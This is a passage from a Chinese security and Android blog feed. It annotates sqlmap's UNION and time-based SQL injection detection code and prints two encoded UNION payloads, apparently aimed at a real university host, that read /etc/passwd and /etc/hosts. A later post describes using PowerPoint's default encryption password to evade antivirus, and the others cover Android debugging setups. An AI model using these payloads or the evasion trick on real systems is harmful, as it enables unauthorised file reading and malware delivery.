class="hljs-keyword">or</span> <span class="hljs-string">&quot;(IIF&quot;</span> <span class="hljs-keyword">in</span> inbandQuery:<br>            inbandQuery += FROM_TABLE[Backend.getIdentifiedDbms()]<br><br>    <span class="hljs-keyword">if</span> intoRegExp:<br>        inbandQuery += intoRegExp<br><br>    <span class="hljs-keyword">if</span> multipleUnions:<br>        inbandQuery += <span class="hljs-string">&quot; UNION ALL SELECT &quot;</span><br><br>        <span class="hljs-keyword">for</span> element <span class="hljs-keyword">in</span> xrange(count):<br>            <span class="hljs-keyword">if</span> element &gt; <span class="hljs-number">0</span>:<br>                inbandQuery += <span class="hljs-string">&quot;, &quot;</span><br><br>            <span class="hljs-keyword">if</span> element == position:<br>                inbandQuery += multipleUnions<br>            <span class="hljs-keyword">else</span>:<br>                inbandQuery += char<br><br>        <span class="hljs-keyword">if</span> Backend.getIdentifiedDbms() <span class="hljs-keyword">in</span> FROM_TABLE:<br>            inbandQuery += FROM_TABLE[Backend.getIdentifiedDbms()]<br><br>    inbandQuery = self.suffixQuery(inbandQuery, comment, suffix)<br><br>    <span class="hljs-keyword">return</span> inbandQuery<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__findUnionCharCount</span>(<span class="hljs-params">comment, place, parameter, value, prefix, suffix, where=PAYLOAD.WHERE.ORIGINAL</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Finds number of columns affected by UNION based injection</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    retVal = <span class="hljs-literal">None</span><br><br>    pushValue(kb.errorIsNone)<br>    items, ratios = [], []<br>    kb.errorIsNone = <span class="hljs-literal">False</span><br>    lowerCount, upperCount = conf.uColsStart, conf.uColsStop<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">abs</span>(upperCount - lowerCount) &lt; MIN_UNION_RESPONSES: <span class="hljs-comment"># MIN_UNION_RESPONSES = 5</span><br>        upperCount = lowerCount + MIN_UNION_RESPONSES<br><br>    min_, max_ = MAX_RATIO, MIN_RATIO <span class="hljs-comment"># MAX_RATIO = 1.0, MIN_RATIO = 0.0</span><br><br>    <span class="hljs-keyword">for</span> count <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(lowerCount, upperCount+<span class="hljs-number">1</span>):<br>        query = agent.forgeInbandQuery(<span class="hljs-string">&#x27;&#x27;</span>, -<span class="hljs-number">1</span>, count, comment, prefix, suffix, conf.uChar)<br>        payload = agent.payload(place=place, parameter=parameter, newValue=query, where=where)<br>        page, _ = Request.queryPage(payload, place=place, content=<span class="hljs-literal">True</span>, raise404=<span class="hljs-literal">False</span>)<br>        ratio = comparison(page, <span class="hljs-literal">True</span>) <span class="hljs-keyword">or</span> MIN_RATIO<br>        ratios.append(ratio)<br>        min_, max_ = <span class="hljs-built_in">min</span>(min_, ratio), <span class="hljs-built_in">max</span>(max_, ratio)<br>        items.append((count, ratio))<br><br>    ratios.pop(ratios.index(min_)) <span class="hljs-comment"># pop the min</span><br>    ratios.pop(ratios.index(max_)) <span class="hljs-comment"># pop the max</span><br> <br>    deviation = stdev(ratios) <span class="hljs-comment"># 计算标准偏差</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">abs</span>(max_ - min_) &lt; MIN_STATISTICAL_RANGE: <span class="hljs-comment"># MIN_STATISTICAL_RANGE = 0.01</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>    <span class="hljs-comment"># UNION_STDEV_COEFF = 7</span><br>    lower, upper = average(ratios) - UNION_STDEV_COEFF * deviation, average(ratios) + UNION_STDEV_COEFF * deviation<br>    minItem, maxItem = <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> items:<br>        <span class="hljs-keyword">if</span> item[<span class="hljs-number">1</span>] == min_:<br>            minItem = item<br>        <span class="hljs-keyword">elif</span> item[<span class="hljs-number">1</span>] == max_:<br>            maxItem = item<br><br>    <span class="hljs-keyword">if</span> min_ &lt; lower:<br>        retVal = minItem[<span class="hljs-number">0</span>]<br><br>    <span class="hljs-keyword">if</span> max_ &gt; upper:<br>        <span class="hljs-keyword">if</span> retVal <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> <span class="hljs-built_in">abs</span>(max_ - upper) &gt; <span class="hljs-built_in">abs</span>(min_ - lower):<br>            retVal = maxItem[<span class="hljs-number">0</span>]<br><br>    kb.errorIsNone = popValue()<br><br>    <span class="hljs-keyword">if</span> retVal:<br>        infoMsg = <span class="hljs-string">&quot;target url appears to be UNION injectable with %d columns&quot;</span> % retVal<br>        logger.info(infoMsg)<br><br>    <span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure><p>(3) 根据不同的数据库加上必要的from 表名<br>(4) 再次验证</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">__unionPosition</span>(<span class="hljs-params">comment, place, parameter, value, prefix, suffix, count, where=PAYLOAD.WHERE.ORIGINAL</span>):<br>    validPayload = <span class="hljs-literal">None</span><br>    vector = <span class="hljs-literal">None</span><br><br>    positions = <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, count)<br><br>    <span class="hljs-comment"># Unbiased approach for searching appropriate usable column</span><br>    <span class="hljs-comment"># list 中元素乱序</span><br>    random.shuffle(positions)<br><br>    <span class="hljs-comment"># For each column of the table (# of NULL) perform a request using</span><br>    <span class="hljs-comment"># the UNION ALL SELECT statement to test it the target url is</span><br>    <span class="hljs-comment"># affected by an exploitable inband SQL injection vulnerability</span><br>    <span class="hljs-comment"># 查找可以显示的列</span><br>    <span class="hljs-keyword">for</span> position <span class="hljs-keyword">in</span> positions:<br>        <span class="hljs-comment"># Prepare expression with delimiters</span><br>        randQuery = randomStr(UNION_MIN_RESPONSE_CHARS) <span class="hljs-comment">#UNION_MIN_RESPONSE_CHARS = 10</span><br>        <span class="hljs-comment"># 构造随机字符串做标记</span><br>        phrase = <span class="hljs-string">&quot;%s%s%s&quot;</span>.lower() % (kb.misc.start, randQuery, kb.misc.stop) <br>        randQueryProcessed = agent.concatQuery(<span class="hljs-string">&quot;\&#x27;%s\&#x27;&quot;</span> % randQuery)<br>        <span class="hljs-keyword">import</span> logging<br>        logging.debug(<span class="hljs-string">&#x27;randQueryProcessed: %s&#x27;</span> % randQueryProcessed)<br>        randQueryUnescaped = unescaper.unescape(randQueryProcessed)<br><br>        <span class="hljs-comment"># Forge the inband SQL injection request</span><br>        <span class="hljs-comment"># 构造UNION ALL SELECT 查询</span><br>        query = agent.forgeInbandQuery(randQueryUnescaped, position, count, comment, prefix, suffix, conf.uChar)<br>        payload = agent.payload(place=place, parameter=parameter, newValue=query, where=where)<br><br>        <span class="hljs-comment"># Perform the request</span><br>        page, headers = Request.queryPage(payload, place=place, content=<span class="hljs-literal">True</span>, raise404=<span class="hljs-literal">False</span>)<br>        <span class="hljs-comment"># 移除反射的内容</span><br>        content = <span class="hljs-string">&quot;%s%s&quot;</span>.lower() % (removeReflectiveValues(page, payload) <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;&quot;</span>, \<br>            removeReflectiveValues(listToStrValue(headers.headers <span class="hljs-keyword">if</span> headers <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span>), \<br>            payload, <span class="hljs-literal">True</span>) <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;&quot;</span>)<br><br>        <span class="hljs-keyword">if</span> content <span class="hljs-keyword">and</span> phrase <span class="hljs-keyword">in</span> content:<br>            validPayload = payload<br>            vector = (position, count, comment, prefix, suffix, conf.uChar, where)<br><br>            <span class="hljs-keyword">if</span> where == PAYLOAD.WHERE.ORIGINAL:<br>                <span class="hljs-comment"># Prepare expression with delimiters</span><br>                randQuery2 = randomStr(UNION_MIN_RESPONSE_CHARS) <span class="hljs-comment"># UNION_MIN_RESPONSE_CHARS = 10</span><br>                phrase2 = <span class="hljs-string">&quot;%s%s%s&quot;</span>.lower() % (kb.misc.start, randQuery2, kb.misc.stop)<br>                randQueryProcessed2 = agent.concatQuery(<span class="hljs-string">&quot;\&#x27;%s\&#x27;&quot;</span> % randQuery2)<br>                randQueryUnescaped2 = unescaper.unescape(randQueryProcessed2)<br><br>                <span class="hljs-comment"># Confirm that it is a full inband SQL injection</span><br>                query = agent.forgeInbandQuery(randQueryUnescaped, position, count, comment, prefix, suffix, conf.uChar, multipleUnions=randQueryUnescaped2)<br>                payload = agent.payload(place=place, parameter=parameter, newValue=query, where=PAYLOAD.WHERE.NEGATIVE)<br><br>                <span class="hljs-comment"># Perform the request</span><br>                page, headers = Request.queryPage(payload, place=place, content=<span class="hljs-literal">True</span>, raise404=<span class="hljs-literal">False</span>)<br>                content = <span class="hljs-string">&quot;%s%s&quot;</span>.lower() % (page <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;&quot;</span>, listToStrValue(headers.headers <span class="hljs-keyword">if</span> headers <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span>) <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;&quot;</span>)<br><br>                <span class="hljs-keyword">if</span> content <span class="hljs-keyword">and</span> ((phrase <span class="hljs-keyword">in</span> content <span class="hljs-keyword">and</span> phrase2 <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> content) <span class="hljs-keyword">or</span> (phrase <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> content <span class="hljs-keyword">and</span> phrase2 <span class="hljs-keyword">in</span> content)):<br>                    vector = (position, count, comment, prefix, suffix, conf.uChar, PAYLOAD.WHERE.NEGATIVE)<br><br>            <span class="hljs-keyword">break</span><br><br>    <span class="hljs-keyword">return</span> validPayload, vector<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://ipv6.tsinghua.edu.cn/end.php?ID=-<span class="hljs-number">3255</span>%<span class="hljs-number">20</span>UNION%<span class="hljs-number">20</span><span class="hljs-literal">ALL</span>%<span class="hljs-number">20</span>SELECT%<span class="hljs-number">20</span>NULL,%<span class="hljs-number">20</span>CONCAT%<span class="hljs-number">28</span>CHAR%<span class="hljs-number">2858</span>,<span class="hljs-number">107</span>,<span class="hljs-number">113</span>,<span class="hljs-number">117</span>,<span class="hljs-number">58</span>%<span class="hljs-number">29</span>,IFNULL%<span class="hljs-number">28</span>CAST%<span class="hljs-number">28</span>LOAD_FILE%<span class="hljs-number">28</span>CHAR%<span class="hljs-number">2847</span>,<span class="hljs-number">101</span>,<span class="hljs-number">116</span>,<span class="hljs-number">99</span>,<span class="hljs-number">47</span>,<span class="hljs-number">104</span>,<span class="hljs-number">111</span>,<span class="hljs-number">115</span>,<span class="hljs-number">116</span>,<span class="hljs-number">115</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>AS%<span class="hljs-number">20</span>CHAR%<span class="hljs-number">29</span>,CHAR%<span class="hljs-number">2832</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>,CHAR%<span class="hljs-number">2858</span>,<span class="hljs-number">101</span>,<span class="hljs-number">114</span>,<span class="hljs-number">112</span>,<span class="hljs-number">58</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>,%<span class="hljs-number">20</span>NULL,%<span class="hljs-number">20</span>NULL,%<span class="hljs-number">20</span>NULL,%<span class="hljs-number">20</span>NULL,%<span class="hljs-number">20</span>NULL#<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://ipv6.tsinghua.edu.cn/end.php?ID=-<span class="hljs-number">8675</span>%<span class="hljs-number">20</span>UNION%<span class="hljs-number">20</span><span class="hljs-literal">ALL</span>%<span class="hljs-number">20</span>SELECT%<span class="hljs-number">20</span>NULL,%<span class="hljs-number">20</span>CONCAT%<span class="hljs-number">28</span>CHAR%<span class="hljs-number">2858</span>,<span class="hljs-number">108</span>,<span class="hljs-number">100</span>,<span class="hljs-number">107</span>,<span class="hljs-number">58</span>%<span class="hljs-number">29</span>,IFNULL%<span class="hljs-number">28</span>CAST%<span class="hljs-number">28</span>LOAD_FILE%<span class="hljs-number">28</span>CHAR%<span class="hljs-number">2847</span>,<span class="hljs-number">101</span>,<span class="hljs-number">116</span>,<span class="hljs-number">99</span>,<span class="hljs-number">47</span>,<span class="hljs-number">112</span>,<span class="hljs-number">97</span>,<span class="hljs-number">115</span>,<span class="hljs-number">115</span>,<span class="hljs-number">119</span>,<span class="hljs-number">100</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>AS%<span class="hljs-number">20</span>CHAR%<span class="hljs-number">29</span>,CHAR%<span class="hljs-number">2832</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>,CHAR%<span class="hljs-number">2858</span>,<span class="hljs-number">111</span>,<span class="hljs-number">121</span>,<span class="hljs-number">105</span>,<span class="hljs-number">58</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>,%<span class="hljs-number">20</span>NULL,%<span class="hljs-number">20</span>NULL,%<span class="hljs-number">20</span>NULL,%<span class="hljs-number">20</span>NULL,%<span class="hljs-number">20</span>NULL#<br></code></pre></td></tr></table></figure><h3 id="基于响应时间-time-based-blind-and-stacked-queries-SQL-injections"><a href="#基于响应时间-time-based-blind-and-stacked-queries-SQL-injections" class="headerlink" title="基于响应时间, time-based blind and stacked queries SQL injections"></a>基于响应时间, time-based blind and stacked queries SQL injections</h3><p>判断是否delay，在 lib&#x2F;core&#x2F;common.py 中wasLastRequestDelayed 实现根据统计结果，sqlmap 注释</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">wasLastRequestDelayed</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Returns True if the last web request resulted in a time-delay</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    <span class="hljs-comment"># 99.9999999997440% of all non time-based sql injection affected</span><br>    <span class="hljs-comment"># response times should be inside +-7*stdev([normal response times])</span><br>    <span class="hljs-comment"># Math reference: http://www.answers.com/topic/standard-deviation</span><br>    deviation = stdev(kb.responseTimes) <span class="hljs-comment"># 计算所有响应时间的标准偏差</span><br>    threadData = getCurrentThreadData()<br><br>    <span class="hljs-keyword">if</span> deviation:<br>        <span class="hljs-comment"># 需要一定数据量，统计结果才有意义</span><br>        <span class="hljs-comment"># MIN_TIME_RESPONSES = 10</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(kb.responseTimes) &lt; MIN_TIME_RESPONSES: <br>            warnMsg = <span class="hljs-string">&quot;time-based standard deviation method used on a model &quot;</span><br>            warnMsg += <span class="hljs-string">&quot;with less than %d response times&quot;</span> % MIN_TIME_RESPONSES<br>            logger.warn(warnMsg)<br><br>        <span class="hljs-comment"># TIME_STDEV_COEFF = 10 必须大于等于7</span><br>        lowerStdLimit = average(kb.responseTimes) + TIME_STDEV_COEFF * deviation<br>        retVal = (threadData.lastQueryDuration &gt;= lowerStdLimit)<br><br>        <span class="hljs-comment"># 如果retVal 为True， 发生Delay，需要调整</span><br>        <span class="hljs-comment"># TIME_DEFAULT_DELAY = 5, kb.testMode sql injection test mode,</span><br>        <span class="hljs-comment"># 用户没用手动更改Delay 时间</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> kb.testMode <span class="hljs-keyword">and</span> retVal <span class="hljs-keyword">and</span> conf.timeSec == TIME_DEFAULT_DELAY:<br>            adjustTimeDelay(threadData.lastQueryDuration, lowerStdLimit)<br><br>        <span class="hljs-keyword">return</span> retVal<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> (threadData.lastQueryDuration - conf.timeSec) &gt;= <span class="hljs-number">0</span><br><br><br><span class="hljs-comment"># length of queue for candidates for time delay adjustment</span><br>TIME_DELAY_CANDIDATES = <span class="hljs-number">3</span><br>kb.delayCandidates = TIME_DELAY_CANDIDATES * [<span class="hljs-number">0</span>]<br>kb.delayCandidates = [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">adjustTimeDelay</span>(<span class="hljs-params">lastQueryDuration, lowerStdLimit</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Adjusts time delay in time-based data retrieval</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    candidate = <span class="hljs-number">1</span> + <span class="hljs-built_in">int</span>(<span class="hljs-built_in">round</span>((<span class="hljs-number">1</span> - (lastQueryDuration - lowerStdLimit) / lastQueryDuration) * conf.timeSec))<br><br>    <span class="hljs-keyword">if</span> candidate:<br>        kb.delayCandidates = [candidate] + kb.delayCandidates[:-<span class="hljs-number">1</span>]<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">all</span>([x == candidate <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> kb.delayCandidates]) <span class="hljs-keyword">and</span> candidate &lt; conf.timeSec:<br>            <span class="hljs-built_in">print</span><br><br>            warnMsg = <span class="hljs-string">&quot;adjusting time delay to %d second%s &quot;</span> % (candidate, <span class="hljs-string">&#x27;s&#x27;</span> <span class="hljs-keyword">if</span> candidate &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;&#x27;</span>)<br>            warnMsg += <span class="hljs-string">&quot;(due to good response times)&quot;</span><br>            logger.warn(warnMsg)<br><br>            conf.timeSec = candidate<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在虚拟机中调试android 手机的方法</title>
    <link href="/cn/android_emulator_debug/"/>
    <url>/cn/android_emulator_debug/</url>
    
    <content type="html"><![CDATA[<p>由于Google的源码是在ubuntu下编译的，Google官方提供了较为详细的编译说明，所以使用 了ubuntu 14.04 进行编译，编译完成后有一个问题，如何进行源码调试。（源代码在虚拟机中）</p><h2 id="使用-virutalbox-Extension-Pack"><a href="#使用-virutalbox-Extension-Pack" class="headerlink" title="使用 virutalbox Extension Pack"></a>使用 virutalbox Extension Pack</h2><p>首先的想法是直接使用中virutalBox 的USB 把手机给连到guest，折腾了一下比较麻烦， 首先需要安装virutalbox 的 Extension Pack，下载地址</p><p><a href="http://download.virtualbox.org/virtualbox/5.1.18/Oracle_VM_VirtualBox_Extension_Pack-5.1.18-114002.vbox-extpack">http://download.virtualbox.org/virtualbox/5.1.18/Oracle_VM_VirtualBox_Extension_Pack-5.1.18-114002.vbox-extpack</a></p><p>管理-&gt;全局设定-&gt;扩展，选择下载的扩展包，安装。接下来这步很关键，上次就是这里没有搞定。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo usermod -a -G vboxusers &lt;username&gt;<br></code></pre></td></tr></table></figure><p>执行命令后需要注销，重新登录。</p><p>VirtualBox 虚拟机设置 -&gt; usb 添加需要接入 guest 的 usb 设备。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt; lsudo lsusb  <br>Bus 001 Device 002: ID 18d1:4ee7 Google Inc.<br>Bus 001 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub<br>Bus 002 Device 002: ID 80ee:0021 VirtualBox USB Tablet<br>Bus 002 Device 001: ID 1d6b:0001 Linux Foundation 1.1 root hub<br></code></pre></td></tr></table></figure><h2 id="使用端口映射"><a href="#使用端口映射" class="headerlink" title="使用端口映射"></a>使用端口映射</h2><p>后面想到adb 其实是通过tcp 和Android设备通讯， 所以只要做端口映射打个通道，就可以解决在virutalBox的虚拟机里调试手机的问题。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tcp</span>        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">127.0.0.1:5037</span>          <span class="hljs-number">0.0.0.0</span>:*               LISTEN      <span class="hljs-number">26706</span>/adb <br></code></pre></td></tr></table></figure><p>在guest里执行下面两条命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">autossh -nNL1234:localhost:1234  10.0.2.2 <br>autossh -nNL5037:localhost:5037  10.0.2.2 <br></code></pre></td></tr></table></figure><p>其中 10.0.2.2 是host的ip，5037 是adb 默认监听的端口，1234 是gdbserver 监听的端 口，利用ssh在host和guest 打个通道。</p><p>在host执行adb forward 命令</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">adb</span> forward tcp:<span class="hljs-number">1234</span> tcp:<span class="hljs-number">1234</span> <br></code></pre></td></tr></table></figure><p>这条命令在host和手机上建立了一条通道。</p><p>这样就搞定了adb的连接问题。执行这三行命令后在ubuntu下， adb devices 可以看到下面的输出, 问题得到解决。</p><figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs node-repl"><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">adb devices  </span><br>List of devices attached  01b00af93dc59e163        device <br><br>gdbclient system_server :1234 4475<br></code></pre></td></tr></table></figure><p>输出正常，可以开始调试了。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PowerPoint 彩蛋和加密</title>
    <link href="/cn/PowerPoint_egg/"/>
    <url>/cn/PowerPoint_egg/</url>
    
    <content type="html"><![CDATA[<h2 id="PowerPoint的彩蛋"><a href="#PowerPoint的彩蛋" class="headerlink" title="PowerPoint的彩蛋"></a>PowerPoint的彩蛋</h2><p>PowerPoint的彩蛋是一个很复杂的密码 &#x2F;01Hannes Ruescher&#x2F;01 发现这个密码是在 binvul的论坛里面，在网上搜索了一下有几个链接提到了这个密码。</p><p><a href="http://social.msdn.microsoft.com/Forums/en-US/4194b097-c5ca-416a-b9d6-7a65ff7d9d43">http://social.msdn.microsoft.com/Forums/en-US/4194b097-c5ca-416a-b9d6-7a65ff7d9d43</a><br><a href="http://msdn.microsoft.com/en-us/library/dd923811(v=office.12).aspx">http://msdn.microsoft.com/en-us/library/dd923811(v=office.12).aspx</a></p><p>第二个链接里面有一段关键的内容，</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-title class_">If</span> <span class="hljs-variable">the</span> <span class="hljs-variable">user</span> <span class="hljs-variable">has</span> <span class="hljs-variable">not</span> <span class="hljs-variable">supplied</span> <span class="hljs-variable">an</span> <span class="hljs-variable">encryption</span> <span class="hljs-variable">password</span> <span class="hljs-variable">and</span> <span class="hljs-variable">the</span> <span class="hljs-variable">document</span> <span class="hljs-operator">is</span> <br><span class="hljs-variable">encrypted</span>, <span class="hljs-variable">the</span> <span class="hljs-variable">default</span> <span class="hljs-variable">encryption</span> <span class="hljs-variable">choice</span> <span class="hljs-variable">using</span> <span class="hljs-variable">the</span> <span class="hljs-variable">techniques</span> <span class="hljs-variable">specified</span> <span class="hljs-keyword">in</span> <br><span class="hljs-variable">section</span> <span class="hljs-number">2.3</span> <span class="hljs-variable">MUST</span> <span class="hljs-variable">be</span> <span class="hljs-variable">the</span> <span class="hljs-variable">following</span> <span class="hljs-variable">password</span>: <br><span class="hljs-string">&quot;\x2f<span class="hljs-char escape_">\x30</span><span class="hljs-char escape_">\x31</span><span class="hljs-char escape_">\x48</span><span class="hljs-char escape_">\x61</span>\x6e\x6e<span class="hljs-char escape_">\x65</span><span class="hljs-char escape_">\x73</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x52</span><span class="hljs-char escape_">\x75</span><span class="hljs-char escape_">\x65</span><span class="hljs-char escape_">\x73</span><span class="hljs-char escape_">\x63</span><span class="hljs-char escape_">\x68</span><span class="hljs-char escape_">\x65</span><span class="hljs-char escape_">\x72</span>\x2f<span class="hljs-char escape_">\x30</span><span class="hljs-char escape_">\x31</span>&quot;</span>.<br></code></pre></td></tr></table></figure><p>这里section 2.3 指的是[MS-PPT]中的section 2.3，我们可以发现这个彩蛋其实就是一个类似默认密码的东西。下面来说说这个密码的神奇之处。</p><h2 id="彩蛋的利用"><a href="#彩蛋的利用" class="headerlink" title="彩蛋的利用"></a>彩蛋的利用</h2><p>主要可以用来过杀软，因为性能原因目前很多杀软都不做PPT文档解密。而用户打开却不需要输入密码，非常巧妙。我在binvul上看到一个利用这个技术的样本。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>[MS-PPT].pdf<br>[MS-OFFCRYPTO].pdf</p>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>非root Android 设备用gdbserver进行native 调试的方法</title>
    <link href="/cn/non_root_android_native_debug/"/>
    <url>/cn/non_root_android_native_debug/</url>
    
    <content type="html"><![CDATA[<p>没有root的设备，要使用gdbserver 调试app 会遇到权限问题。(emulator 没有问题)</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-number">1</span>|shell<span class="hljs-variable">@mako</span><span class="hljs-symbol">:/data/local/tmp</span> <span class="hljs-variable">$ </span>./gdbserver <span class="hljs-symbol">:</span><span class="hljs-number">1234</span> --attach <span class="hljs-number">16907</span><br><span class="hljs-title class_">Cannot</span> attach to lwp <span class="hljs-number">16907</span>: <span class="hljs-title class_">Operation</span> <span class="hljs-keyword">not</span> permitted (<span class="hljs-number">1</span>)<br><span class="hljs-title class_">Exiting</span><br></code></pre></td></tr></table></figure><p>Android 系统提供了一个run-as 命令来暂时切换用户，但是这个命令有限制，必须是app 打开了debuggable才行，否则会报 Package xx is not debuggable 的错误。<br>从 <a href="http://android.googlesource.com/platform/system/core.git/+/master/run-as/run-as.c">http://android.googlesource.com/platform/system/core.git/+/master/run-as/run-as.c</a> 的注释来看，主要的作用有两个：</p><ul><li>可以查看自己开发的应用的数据</li><li>可以使用gdb_server 进行native 的debug</li></ul><p>我们的需求是第2个，我们希望可以使用gdb_server 来调试 app</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 